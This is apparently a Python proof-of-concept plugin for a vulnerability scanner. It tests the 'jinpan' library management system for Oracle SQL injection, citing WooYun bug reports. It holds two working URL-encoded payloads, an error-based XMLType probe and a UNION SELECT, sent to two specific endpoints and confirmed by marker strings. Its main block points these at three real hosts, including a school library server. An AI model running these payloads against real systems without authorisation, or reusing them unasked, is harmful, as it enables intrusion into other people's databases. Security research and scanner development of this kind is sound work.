#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-076316
#refer:http://www.wooyun.org/bugs/wooyun-2010-085140

import re

def assign(service, arg):
    if service == "jinpan":
        return True, arg
        
        
def audit(arg): 
    payload = 'opac/rss/do.jsp?marcType=1'
    getdata = '%20AND%206615%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286615%3D6615%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29'
    url = arg + payload +getdata      
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 500  and 'qbzxq1qppjq' in res :
        security_hole(arg+payload+'   :found sql Injection')
        
        
     
    payload = 'AdvicesRequest.aspx?DBKey=20004'
    getdata = '%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2869%29%7C%7CCHR%2890%29%7C%7CCHR%28118%29%7C%7CCHR%28116%29%7C%7CCHR%28119%29%7C%7CCHR%28113%29%7C%7CCHR%2884%29%7C%7CCHR%2885%29%7C%7CCHR%28102%29%7C%7CCHR%2882%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%20FROM%20DUAL--'
    url = arg + payload +getdata
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200  and 'qzkpqEZvtwqTUfRqzqvq' in res :
        security_hole(arg+payload+'   :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('jinpan', 'http://library.cnuschool.org.cn:8080/')[1])
    audit(assign('jinpan', 'http://113.247.235.133:8081/')[1])
    audit(assign('jinpan', 'http://211.80.179.195/')[1])